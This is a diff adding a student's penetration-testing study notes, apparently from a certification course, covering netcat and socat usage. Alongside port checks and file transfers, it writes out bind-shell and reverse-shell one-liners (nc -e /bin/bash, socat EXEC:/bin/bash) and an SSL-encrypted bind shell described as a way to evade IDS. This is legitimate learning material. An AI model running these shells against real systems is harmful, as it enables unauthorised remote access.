@@ -1,0 +1,89 @@
+------------------
+NOTES
+------------------
+These practice challenges are literally dog water, all the bind shells get "bash: line 2: flag.txt: Permission denied"
+
+Netcat
+	OG network pentesting tool swiss army knife or whatever
+	Connecting to a TCP/UDP port
+		can be used to:
+			check if a port is open or closed
+			read a banner from the service listening on a port
+			connect to a network service manually
+
+		nc -nv 10.11.0.2 110
+			-n = skip dns resolution
+			-v = add verbosity
+
+	Listening on a TCP/UDP port
+		used usually for file transfers or reverse shells
+		nc -nlvp 9001
+			-n = skip dns resolution
+			-l = listen
+			-v = add verbosity
+			-p = specify port
+
+	Transferring files with Netcat
+		redirect the output to a file
+		omg with the redirection learned in the last module
+
+			From server
+				nc -nlvp 9001 > file.txt
+			From client
+				nc -nv 9001 < file.txt
+
+	Remote admin from netcat
+		traditional version of nc which has been compiled with the "-DGAPING_SECURITY_HOLE" flag (lol) has -e
+		which will execute a program after making or receiving a successful connection
+
+		Netcat bind shell
+			From server
+				nc -nlvp 4444 -e cmd.exe
+					will open a port and redirect cmd.exe to that port
+				nc -nlvp 4444 -e /bin/bash
+					samething, just on linux
+			From client
+				nc -nv <IP> 4444
+
+		Netcat reverse shell
+			reverse shells generally get around firewall issues :)
+				From client
+					nc -lvvp 9001
+				From server
+					nc -nv <IP> 9001 -e /bin/bash
+
+Socat
+	cli util that creates a bidirectional byte stream, similar to netcat but has come more utilities
+	Netcat vs Socat
+		nc <remote server's ip address> 80
+		socat - TCP4:<remote server's ip address>:80
+			TCP4 is required to use STDIO
+
+		sudo nc -lvp localhost 443
+		sudo socat TCP4-LISTEN:443 STDOUT
+
+	Socat File Transfers
+		From Server
+			sudo socat TCP4-LISTEN:443,fork file:file.txt
+		From Client
+			socat TCP4:10.11.0.4:443 file:recv_file.txt,create
+			cat recv_file.txt
+
+	Socat Reverse Shells
+		From Client
+			socat -d -d TCP4-LISTEN:443 STDOUT
+		From Server
+			socat TCP4:10.11.0.22:443 EXEC:/bin/bash
+
+	Socat Encrypted Bind Shells
+		Create encrypted bind shells to evade some form of IDS'
+		uses ssl to encrypt data
+			From victim
+				openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
+				cat bind_shell.key bind_shell.crt > bind_shell.pem
+				sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+			From Attacker
+				socat - OPENSSL:10.11.0.4:443,verify=0
+
+
+
